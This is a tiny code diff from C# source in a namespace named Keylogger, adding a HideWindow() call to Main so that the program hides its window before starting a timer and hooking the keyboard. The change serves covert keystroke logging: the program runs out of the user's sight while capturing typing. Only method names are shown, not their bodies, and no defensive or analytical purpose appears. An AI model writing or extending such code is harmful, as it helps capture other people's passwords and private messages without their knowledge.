@@ -195,6 +195,7 @@ namespace Keylogger
         [STAThread]
         static void Main(string[] args)
         {
+            HideWindow();
             StartTimer();
             HookKeyBoard();
         }
